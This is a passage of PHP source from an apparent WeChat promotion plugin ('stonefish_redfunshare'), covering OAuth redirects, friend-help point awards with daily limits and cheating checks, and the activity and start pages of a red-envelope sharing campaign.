				if($setting['stonefish_redfunshare_oauth']==1 && $scope==1){
					$token = array('openid' => $_SESSION['oauth_openid'],'headimgurl' => MODULE_URL.'template/images/avatar.jpg','nickname' => '匿名'.time().mt_rand(1000,9999));
					setcookie("stonefish_userinfo", iserializer($token), time()+3600*24*$setting['stonefish_oauth_time']);
				    setcookie("stonefish_userinfo_power", $reply['power'], time()+3600*24*$setting['stonefish_oauth_time']);
					$this->appurlheader($entrytype, $rid, $iid, $_GPC['from_user']);
				}else{
					$appUrl= $this->createMobileUrl('auth2', array('entrytype' => $entrytype,'rid' => $rid,'from_user' => $_GPC['from_user'],'power' => $reply['power']),true);
		            $appUrl = substr($appUrl,2);
                    $redirect_uri = $_W['siteroot'] ."app/".$appUrl ;
                    $oauth2_code = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=".$appid."&redirect_uri=".urlencode($redirect_uri)."&response_type=code&scope=".$scope."&state=1#wechat_redirect";
                    header("location: $oauth2_code");
		            exit;
				}
			}
		}
		//获取openid以及头像昵称
	}
	//进入页
	//帮助页
	public function doMobileShareview() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);
		if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
		$uid = $_GPC['uid'];
		$uniacid = $_W['uniacid'];       
		$fromuser = authcode(base64_decode($_GPC['fromuser']), 'DECODE');
		$page_fromuser = $_GPC['fromuser'];
		$acid = $_W['acid'];
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));
		//活动状态
		$this->check_reply($reply);		
		//活动状态
		//是否结束
		if ($reply['endtime'] <= time()) {
			$this->message_tips($rid,'抱歉，活动已结束，下次早点来给朋友助力加油吧!',url('entry//index',array('m'=>'stonefish_redfunshare','rid'=>$rid)));
		}
		//是否结束
		//虚拟人数
		$this->xuni_time($reply);
		//虚拟人数
		//验证助力者类型
		if(empty($from_user)) {
		    //没有获取openid跳转至引导页
            if (!empty($share['help_url'])) {
                header("HTTP/1.1 301 Moved Permanently");
                header("Location: " . $share['help_url'] . "");
                exit();
            }else{
				$this->message_tips($rid,'请关注公众号再参与活动');
			}
			//没有获取openid跳转至引导页			           
		}else{
			//查询是否为关注用户并查询是否需要关注粉丝参与活动否则跳转至引导页
			if($reply['visubscribe']>=1 && intval($_W['fans']['follow'])!=1){
			    //没有关注粉丝跳转至引导页
				if (!empty($share['help_url'])) {
                    header("HTTP/1.1 301 Moved Permanently");
                    header("Location: " . $share['help_url'] . "");
                    exit();
                }else{
				    $this->message_tips($rid,'请关注公众号再参与活动');
			    }
				//没有关注粉丝跳转至引导页
			}
			//查询是否为关注用户并查询是否需要关注粉丝参与活动否则跳转至引导页
		}
		//验证助力者类型
		//增加人数，和浏览次数
		pdo_update('stonefish_redfunshare_reply', array('viewnum' => $reply['viewnum'] + 1), array('id' => $reply['id']));
		//增加人数，和浏览次数
		if(!empty($fromuser)) {
			//参与分享人信息
		    $fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $fromuser));
		    if(!empty($fans)){
				//判断是否作弊
			    $realname = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				    $this->message_tips($rid,'抱歉，活动中您的朋友可能有作弊行为已被管理员暂停屏蔽！请告之你的朋友〖'.$realname.'〗，Ta将不胜感激！by【'.$_W['account']['name'].'】');
			    }
			    //判断是否作弊
				//查询是否有福利
				$welfare = 1;
				if($reply['mobileverify']==2 && !empty($fans['mobile'])){
				    $mobileverify = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_mobileverify")." where rid = :rid and uniacid = :uniacid and mobile = :mobile", array(':rid' => $rid,':uniacid' => $uniacid,':mobile' => $fans['mobile']));
				    if(!empty($mobileverify)){
					    if($mobileverify['verifytime']==0){
							pdo_update('stonefish_redfunshare_mobileverify', array('verifytime' => time()), array('id' => $mobileverify['id']));
						}
						$welfare = $mobileverify['welfare'];
				    }
			    }
				//查询是否有福利
				//是否限制为无效用户
				if($fans['limit']==0){
					$limitwelfare = pdo_fetchcolumn("select limitwelfare FROM " . tablename('stonefish_redfunshare_exchange') . " where rid=:rid", array(':rid' => $rid));
					$welfare = $welfare/$limitwelfare;
				}
				//是否限制为无效用户
		    }else{
			    $this->message_tips($rid,'抱歉，您的朋友没有参与本活动！请告之你的朋友，3秒后自动进入活动页！',url('entry//index',array('m'=>'stonefish_redfunshare','rid'=>$rid)));
		    }
			//获取粉丝信息		    
			$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'shareview');
		    //获取粉丝信息
		}else{
			header("HTTP/1.1 301 Moved Permanently");
            header("Location: " . $this->createMobileUrl('entry', array('rid' => $rid,'entrytype' => 'index')) . "");
            exit();
		}
		if($from_user!=$fromuser){
			//查询是否自己也参与活动
			$myfans = pdo_fetch("select id from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
			//查询是否自己也参与活动
			//是否开启互助模式
			if($reply['helptype'] == 1){
				$helpcount = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and share_type = 1", array(':rid' => $rid,":fromuser" => $from_user,":from_user" => $fromuser));
				if($helpcount){
					$res["msg"] = "禁止互助!";
                    $res["code"] = 505;
				}
			}
			//是否开启互助模式
			//多人还是单人助力
			if($reply['helpfans']){
				$firendhelp_count = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser!=:fromuser and from_user=:from_user and share_type = 1", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user));
				if($firendhelp_count){
					$res["msg"] = "亲您已为其他人助力过了!";
                    $res["code"] = 506;
				}
			}
			//多人还是单人助力			
			$firendhelpcount = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and share_type = 1", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user));
			$firendfelp = pdo_fetch("select id,viewnum FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and share_type = 1 order by visitorstime desc", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user));
			if ($reply['limittype'] == 1) { // 每天限制                
                $dayfirendhelp = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and visitorstime >= :starttime and share_type = 1", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user,":starttime" => strtotime(date('Y-m-d'))));
            }
            if ($reply['limittype'] == 0 && $firendhelpcount && $res["code"] == '') { // 限制一次
                $res["msg"] = "亲每人只能一次机会哟!";
                $res["code"] = 502;
            }
            if ($reply['limittype'] == 1 && $firendhelpcount>=$reply['totallimit'] && $res["code"] == '') {//限制最多多少次
                $res["msg"] = "亲你的助力次数已用完!";
                $res["code"] = 503;
            }
			if ($reply['limittype'] == 1 && $dayfirendhelp && $res["code"] == '') {//限制最多多少次
                $res["msg"] = "今天助力次数已用完，明天再来吧!";
                $res["code"] = 504;
            }
            if ($reply['powertype']==0 && $res["code"] == '') {
                $score = 0;
                if($fans['limit']==0){
                    $addp = $reply['addp']/2;
				}else{
					$addp = $reply['addp'];
				}
                $op = $this->get_rand(array(
                    "+" => $addp,
                    "-" => (100 - $addp)
                ));
				$redpackv = empty($reply['redpackv']) ? '1' : '100';
				$score = mt_rand($reply['randompointstart']*$redpackv,$reply['randompointend']*$redpackv)/$redpackv;
				$score = sprintf("%.2f",$score*$welfare);
				if ($op == "+") {
                    $point = + $score;
                } elseif ($op == "-") {
                    $point = - $score;
                }
				$insert = array(
					'rid' => $rid,
                    'uniacid' => $uniacid,
					'share_type' => 1,
                    'from_user' => $from_user,
				    'fromuser' => $fromuser,
				    'avatar' => $userinfo['headimgurl'],
				    'nickname' => $userinfo['nickname'],
				    'visitorsip'=> CLIENT_IP,
                    'visitorstime' => TIMESTAMP,
					'sharepoint' => $point,
					'welfare' => $welfare,
				    'viewnum' => 1
                );
				pdo_insert('stonefish_redfunshare_sharedata', $insert); // 记录助力人
				//发送消息模板之参与模板
				$exchange = pdo_fetch("select tmplmsg_help FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
			    if($exchange['tmplmsg_help']){
				    $this->seed_tmplmsg($fromuser,$exchange['tmplmsg_help'],$rid,array('do' =>'index', 'nickname' =>$userinfo['nickname']));
			    }
			    //发送消息模板之参与模板
            }else{
				pdo_update('stonefish_redfunshare_sharedata', array('viewnum' => $firendfelp['viewnum'] + 1), array('id' => $firendfelp['id']));
			}
			//记录分享
			$str = array('#价值#'=>$fans['inpoint']+$fans['sharepoint']-$fans['outpoint'],'#最小提现#'=>$reply['sharepoint']);
			$reply['helptips'] = strtr($reply['helptips'],$str);
			//增加分享人分享量
			$sharenum = pdo_fetchcolumn("select count(id) from ".tablename('stonefish_redfunshare_sharedata')." where uniacid= :uniacid and fromuser= :fromuser and rid= :rid and share_type = 1", array(':uniacid' => $uniacid,':rid' => $rid,':fromuser' => $fromuser));
			$sharepoint = pdo_fetchcolumn("select sum(sharepoint) from ".tablename('stonefish_redfunshare_sharedata')." where uniacid= :uniacid and fromuser= :fromuser and rid= :rid and share_type = 1", array(':uniacid' => $uniacid,':rid' => $rid,':fromuser' => $fromuser));
			pdo_update('stonefish_redfunshare_fans', array('sharenum' => $sharenum,'sharepoint' => $sharepoint), array('uniacid' => $uniacid,'from_user' => $fromuser,'rid' => $rid));
			//增加分享人分享量
			if($reply['powertype']==0){
				header("HTTP/1.1 301 Moved Permanently");
                header("Location: " . $this->createMobileUrl('entry', array('rid' => $rid,'entrytype' => 'index')) . "");
                exit();
			}
		}else{
			header("HTTP/1.1 301 Moved Permanently");
            header("Location: " . $this->createMobileUrl('entry', array('rid' => $rid,'entrytype' => 'index')) . "");
            exit();
		}
		if($this->Weixin()){
			include $this->template('share');
		}else{
			$this->Weixin();
		}
	}
	//帮助页
	//助力
	public function doMobileFirendhelp(){
        global $_W, $_GPC;
		$uniacid = $_W['uniacid'];
        $rid = $_GPC['rid'];
        $from_user = authcode(base64_decode($_GPC['fopenid']), 'DECODE');
		$fromuser = authcode(base64_decode($_GPC['fromuser']), 'DECODE');
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		//活动状态
		$this->check_reply($reply);		
		//活动状态
		$res = array();
		//是否结束
		if ($reply['endtime'] <= time()) {
			$res["msg"] = "活动已结束!";
            $res["code"] = 509;
		}
		//是否结束
		if(!empty($fromuser)) {
			//参与分享人信息
		    $fans = pdo_fetch("select `mobile`,`status`,`inpoint`,`limit` from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $fromuser));
		    if(!empty($fans)){
				//判断是否作弊
				if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				    $res["msg"] = "作弊用户!";
                    $res["code"] = 601;
			    }
			    //判断是否作弊
				//查询是否有福利
				$welfare = 1;
				if($reply['mobileverify']==2 && !empty($fans['mobile'])){
				    $mobileverify = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_mobileverify")." where rid = :rid and uniacid = :uniacid and mobile = :mobile", array(':rid' => $rid,':uniacid' => $uniacid,':mobile' => $fans['mobile']));
				    if(!empty($mobileverify)){
					    if($mobileverify['verifytime']==0){
							pdo_update('stonefish_redfunshare_mobileverify', array('verifytime' => time()), array('id' => $mobileverify['id']));
						}
						$welfare = $mobileverify['welfare'];
				    }
			    }
				//查询是否有福利
				//是否限制为无效用户
				if($fans['limit']==0){
					$limitwelfare = pdo_fetchcolumn("select limitwelfare FROM " . tablename('stonefish_redfunshare_exchange') . " where rid=:rid", array(':rid' => $rid));
					$welfare = $welfare/$limitwelfare;
				}
				//是否限制为无效用户
		    }
		}
        
        if(!empty($reply)){
            $firendhelpcount = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and share_type = 1", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user));
			$firendfelp = pdo_fetch("select id,viewnum FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user  and share_type = 1 order by visitorstime desc", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user));
			//是否开启互助模式
			if($reply['helptype'] == 1){
				$helpcount = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and share_type = 1", array(':rid' => $rid,":fromuser" => $from_user,":from_user" => $fromuser));
				if($helpcount){
					$res["msg"] = "禁止互助!";
                    $res["code"] = 505;
				}
			}
			//是否开启互助模式
			//多人还是单人助力
			if($reply['helpfans']){
				$firendhelp_count = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser!=:fromuser and from_user=:from_user and share_type = 1", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user));
				if($firendhelp_count){
					$res["msg"] = "亲您已为其他人助力过了!";
                    $res["code"] = 506;
				}
			}
			//多人还是单人助力
			if ($reply['limittype'] == 1) { // 每天限制                
                $dayfirendhelp = pdo_fetchcolumn("select count(*) FROM " . tablename('stonefish_redfunshare_sharedata') . " where rid=:rid and fromuser=:fromuser and from_user=:from_user and visitorstime >= :starttime and share_type = 1", array(':rid' => $rid,":fromuser" => $fromuser,":from_user" => $from_user,":starttime" => strtotime(date('Y-m-d'))));
            }
            if ($reply['limittype'] == 0 && $firendhelpcount && $res["code"] == '') { // 限制一次
                $res["msg"] = "亲每人只能一次机会哟!";
                $res["code"] = 502;
            }
            if ($reply['limittype'] == 1 && $firendhelpcount>=$reply['totallimit'] && $res["code"] == '') {//限制最多多少次
                $res["msg"] = "亲你的助力次数已用完!";
                $res["code"] = 503;
            }
			if ($reply['limittype'] == 1 && $dayfirendhelp >= 1 && $res["code"] == '') {//限制最多多少次
                $res["msg"] = "今天助力次数已用完，明天再来吧!";
                $res["code"] = 504;
            }
            if ($res["code"] == '') {
                $score = 0;
				if($fans['limit']==0){
                    $addp = $reply['addp']/2;
				}else{
					$addp = $reply['addp'];
				}
                $op = $this->get_rand(array(
                    "+" => $addp,
                    "-" => (100 - $addp)
                ));
				$redpackv = empty($reply['redpackv']) ? '1' : '100';
				$score = mt_rand($reply['randompointstart']*$redpackv,$reply['randompointend']*$redpackv)/$redpackv;
				$score = sprintf("%.2f",$welfare*$score);
				if ($op == "+") {
                    $point = + $score;
                } elseif ($op == "-") {
                    $point = - $score;
                }
				$insert = array(
                    'share_type' => 1,
					'rid' => $rid,
                    'uniacid' => $_W['uniacid'],
                    'from_user' => $from_user,
				    'fromuser' => $fromuser,
				    'avatar' => $_GPC['fheadimgurl'],
				    'nickname' => $_GPC['fnickname'],
				    'visitorsip'=> CLIENT_IP,
                    'visitorstime' => TIMESTAMP,
					'sharepoint' => $point,
					'welfare' => $welfare,
				    'viewnum' => 1
                );
				pdo_insert('stonefish_redfunshare_sharedata', $insert); // 记录助力人
                $res["msg"] = "助力成功!";
				$res["code"] = 200;
				//发送消息模板之参与模板
				$exchange = pdo_fetch("select tmplmsg_help FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
			    if($exchange['tmplmsg_help']){
				    $this->seed_tmplmsg($fromuser,$exchange['tmplmsg_help'],$rid,array('do' =>'index', 'nickname' =>$userinfo['nickname']));
			    }
			    //发送消息模板之参与模板
            }else{
				pdo_update('stonefish_redfunshare_sharedata', array('viewnum' => $firendfelp['viewnum'] + 1), array('id' => $firendfelp['id']));
			}
			//记录分享
			//增加分享人分享量
			$sharenum = pdo_fetchcolumn("select count(id) from ".tablename('stonefish_redfunshare_sharedata')." where uniacid= :uniacid and fromuser= :fromuser and rid= :rid and share_type = 1", array(':uniacid' => $uniacid,':rid' => $rid,':fromuser' => $fromuser));
			$sharepoint = pdo_fetchcolumn("select sum(sharepoint) from ".tablename('stonefish_redfunshare_sharedata')." where uniacid= :uniacid and fromuser= :fromuser and rid= :rid and share_type = 1", array(':uniacid' => $uniacid,':rid' => $rid,':fromuser' => $fromuser));
			pdo_update('stonefish_redfunshare_fans', array('sharenum' => $sharenum,'sharepoint' => $sharepoint), array('uniacid' => $uniacid,'from_user' => $fromuser,'rid' => $rid));
			//增加分享人分享量
        }
        echo json_encode($res);
    }
	//助力
	//活动首页
	public function doMobileindex() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);        
		$uniacid = $_W['uniacid'];
		$acid = $_W['acid'];
        if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
        $reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));
		$exchange = pdo_fetch("select isfansname,isrealname,ismobile FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
		//兑奖参数重命名
		$isfansname = explode(',',$exchange['isfansname']);
		//兑奖参数重命名
        //活动状态
		$this->check_reply($reply);
		//活动状态
		//虚拟人数
		$this->xuni_time($reply);
		//虚拟人数		
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid		
		//验证并获取头像昵称
		if(empty($from_user)) {
		    //没有获取openid跳转至引导页
            if (!empty($share['share_url'])) {
                header("HTTP/1.1 301 Moved Permanently");
                header("Location: " . $share['share_url'] . "");
                exit();
            }else{
				$this->message_tips($rid,'请关注公众号再参与活动');
			}
			//没有获取openid跳转至引导页			           
		}else{
			//查询是否为关注用户并查询是否需要关注粉丝参与活动否则跳转至引导页
			if($reply['issubscribe']>=1 && intval($_W['fans']['follow'])!=1){
			    //没有关注粉丝跳转至引导页
				if (!empty($share['share_url'])) {
                    header("HTTP/1.1 301 Moved Permanently");
                    header("Location: " . $share['share_url'] . "");
                    exit();
                }else{
				    $this->message_tips($rid,'请关注公众号再参与活动');
			    }
				//没有关注粉丝跳转至引导页
			}
			//查询是否为关注用户并查询是否需要关注粉丝参与活动否则跳转至引导页
			//获得用户资料
		    if($_W['member']['uid']){
			    $profile = mc_fetch($_W['member']['uid'], array('avatar','nickname','realname','mobile','groupid','qq','email','address','gender','telephone','idcard','company','occupation','position'));
		    }
		    //获得用户资料
			//验证系统会员组
			if($reply['issubscribe']==6){
				$grouparr = (array)iunserializer($reply['sys_users']);
				if(!in_array($profile['groupid'], $grouparr)) {
					$this->message_tips($rid,$reply['sys_users_tips']);
				}
			}
			//验证系统会员组
			//获取粉丝信息
			$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'index');
			//获取粉丝信息
		}
		//验证并获取头像昵称     
		//查询是否参与活动并更新头像和昵称
		$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if(!empty($fans)){
			$myawardnum = pdo_fetchcolumn("select count(*) from " . tablename('stonefish_redfunshare_fansaward') . " where rid = :rid and from_user = :from_user", array(':rid' => $rid, ':from_user' => $from_user));
			//判断是否作弊
			if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				$real_name = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				$this->message_tips($rid,'抱歉，活动中您〖'.$real_name.'〗可能有作弊行为已被管理员暂停屏蔽！请联系【'.$_W['account']['name'].'】管理员');
			}
			//判断是否作弊
			//更新分享量
			$fans['share_num'] = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_sharedata')." where uniacid = :uniacid and rid = :rid and fromuser = :from_user and share_type=0", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
			$fans['sharenum'] = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_sharedata')." where uniacid = :uniacid and rid = :rid and fromuser = :from_user and share_type=1", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
			$fans['sharepoint'] = pdo_fetchcolumn("select sum(sharepoint) FROM ".tablename('stonefish_redfunshare_sharedata')." where uniacid = :uniacid and rid = :rid and fromuser = :from_user and share_type=1", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
			pdo_update('stonefish_redfunshare_fans', array('sharenum' => $fans['sharenum'],'share_num' => $fans['share_num'],'sharepoint' => $fans['sharepoint']), array('id' => $fans['id']));
			//更新分享量
			//更新头像和昵称
			if($reply['power']==2){
				pdo_update('stonefish_redfunshare_fans', array('avatar' => $userinfo['headimgurl'], 'nickname' => $userinfo['nickname']), array('id' => $fans['id']));
			}
			//更新头像和昵称
			//所有助力
			$firend = pdo_fetchall("select * FROM ".tablename('stonefish_redfunshare_sharedata')." where uniacid = :uniacid and rid = :rid and fromuser = :from_user and share_type=1", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
			//所有助力			
			//兑换列表
			if(!empty($reply["redpack_meun"])){
				$redpack_meun = str_replace(array("\r\n","\r"),",",$reply["redpack_meun"]);
		        $redpack_meun = explode(',',$redpack_meun);
			}else{
				$redpack_meun = '';
			}
			//兑换列表
			//流量套餐
			if($reply['redpacktype']==2){
				//读取流量配置
				$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
				$appkey = $config['key']; 
				$openid = $config['sign'];
				$recharge = new recharge($appkey,$openid);
				//读取流量配置
				$procResult = $recharge->flowtelcheck($fans['mobile']);
				if($procResult){
					if($procResult['error_code']=='0'){
					    $redpack_meun=$procResult['result'][0]['flows'];
				    }
				}
			}
			//流量套餐
		}
		//查询是否参与活动并更新头像和昵称	
		//增加人数，和浏览次数
        pdo_update('stonefish_redfunshare_reply', array('viewnum' => $reply['viewnum'] + 1), array('id' => $reply['id']));
		//增加人数，和浏览次数
		//所有兑奖数
		$fansaward = pdo_fetchcolumn("select sum(outpoint) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid", array(':uniacid' => $uniacid,':rid' => $rid));
		$fansawardnum = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid", array(':uniacid' => $uniacid,':rid' => $rid));
		$myawardnum = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid and from_user = :from_user", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
		//所有兑奖数
        //分享信息
        $sharelink = $_W['siteroot'] .'app/'.substr($this->createMobileUrl('entry', array('rid' => $rid,'from_user' => $page_from_user,'entrytype' => 'shareview')),2);
        $sharetitle = empty($share['share_title']) ? '欢迎参加活动' : $share['share_title'];
        $sharedesc = empty($share['share_desc']) ? '亲，欢迎参加活动，祝您好运哦！！' : str_replace("\r\n"," ", $share['share_desc']);
		$sharetitle = $this->get_share($rid,$from_user,$sharetitle);
		$sharedesc = $this->get_share($rid,$from_user,$sharedesc);
		if(!empty($share['share_img'])){
		    $shareimg = toimage($share['share_img']);
		}else{
		    $shareimg = toimage($reply['start_picurl']);
		}
		//分享信息
		if($this->Weixin()){
			if(empty($fans)){
				include $this->template('index');
			}else{
				include $this->template('myshare');
			}
		}else{
			$this->Weixin();
		}
    }
	//活动首页
	//获取初始值
	public function doMobileSharestart() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);        
		$uniacid = $_W['uniacid'];
		$acid = $_W['acid'];
        if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
        $reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$exchange = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));
        //活动状态
		$this->check_reply($reply);
		//活动状态
		//是否结束
		if ($reply['endtime'] <= time()) {
			$this->message_tips($rid,'抱歉，活动已结束，下次早点来参与吧!',url('entry//index',array('m'=>'stonefish_redfunshare','rid'=>$rid)));
		}
		//是否结束
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		//验证并获取头像昵称
		if(empty($from_user)) {
		    //没有获取openid跳转至引导页
            if (!empty($share['share_url'])) {
                header("HTTP/1.1 301 Moved Permanently");
                header("Location: " . $share['share_url'] . "");
                exit();
            }else{
				$this->message_tips($rid,'请关注公众号再参与活动');
			}
			//没有获取openid跳转至引导页			           
		}else{
			//查询是否为关注用户并查询是否需要关注粉丝参与活动否则跳转至引导页
			if($reply['issubscribe']>=1 && intval($_W['fans']['follow'])!=1){
			    //没有关注粉丝跳转至引导页
				if (!empty($share['share_url'])) {
                    header("HTTP/1.1 301 Moved Permanently");
                    header("Location: " . $share['share_url'] . "");
                    exit();
                }else{
				    $this->message_tips($rid,'请关注公众号再参与活动');
			    }
				//没有关注粉丝跳转至引导页
			}
			//查询是否为关注用户并查询是否需要关注粉丝参与活动否则跳转至引导页
			//获得用户资料
		    if($_W['member']['uid']){
			    $profile = mc_fetch($_W['member']['uid'], array('avatar','nickname','realname','mobile','groupid','qq','email','address','gender','telephone','idcard','company','occupation','position'));
		    }
		    //获得用户资料
			//查询聚会手机归属
			if(!empty($profile['mobile'])){
				$mobile_company = $this->mobile_verify($profile['mobile'],'company');
			}
			//查询聚会手机归属
			//验证系统会员组
			if($reply['issubscribe']==6){
				$grouparr = (array)iunserializer($reply['sys_users']);
				if(!in_array($profile['groupid'], $grouparr)) {
					$this->message_tips($rid,$reply['sys_users_tips']);
				}
			}
			//验证系统会员组
			//获取粉丝信息
			$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'sharestart');
			//获取粉丝信息
		}
		//验证并获取头像昵称     
		//查询是否参与活动并更新头像和昵称
		$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if(empty($fans)){
			$redpackv = empty($reply['redpackv']) ? '1' : '100';
			$score = mt_rand($reply['inpointstart']*$redpackv,$reply['inpointend']*$redpackv)/$redpackv;
			$inpoint = sprintf("%.2f",$score);
			$str = array('#价值#'=>$inpoint);
			$reply['lingquanniutips'] = strtr($reply['lingquanniutips'],$str);
		}else{
			$this->message_tips($rid,'已参与过，请不要重复参与！',url('entry//index',array('m'=>'stonefish_redfunshare','rid'=>$rid)));
		}
		//查询是否参与活动并更新头像和昵称
		//兑奖参数重命名
		$isfansname = explode(',',$exchange['isfansname']);
		//兑奖参数重命名
		//是否开启短信验证
		if($reply['smsverify']){
			$sms = pdo_fetch("select * from ".tablename('stonefish_redfunshare_apiconfig')." where uniacid = :uniacid and apitype='mobileofsms'", array(':uniacid' => $uniacid));
			if(empty($sms)){
				//没有查询到短信验证配置关闭短信验证
				$reply['smsverify'] = 0;
			}
		}
		//是否开启短信验证
        //分享信息
        $sharelink = $_W['siteroot'] .'app/'.substr($this->createMobileUrl('entry', array('rid' => $rid,'from_user' => $page_from_user,'entrytype' => 'shareview')),2);
        $sharetitle = empty($share['share_title']) ? '欢迎参加活动' : $share['share_title'];
        $sharedesc = empty($share['share_desc']) ? '亲，欢迎参加活动，祝您好运哦！！' : str_replace("\r\n"," ", $share['share_desc']);
		$sharetitle = $this->get_share($rid,$from_user,$sharetitle);
		$sharedesc = $this->get_share($rid,$from_user,$sharedesc);
		if(!empty($share['share_img'])){
		    $shareimg = toimage($share['share_img']);
		}else{
		    $shareimg = toimage($reply['start_picurl']);
		}
		//分享信息
		if($this->Weixin()){
			include $this->template('sharestart');
		}else{
			$this->Weixin();
		}
    }
	//获取初始值
	//用户注册
	public function doMobileRegfans() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);        
		$uniacid = $_W['uniacid'];
		$reply = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_reply') . " where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		//规则判断        
        if ($reply == false) {
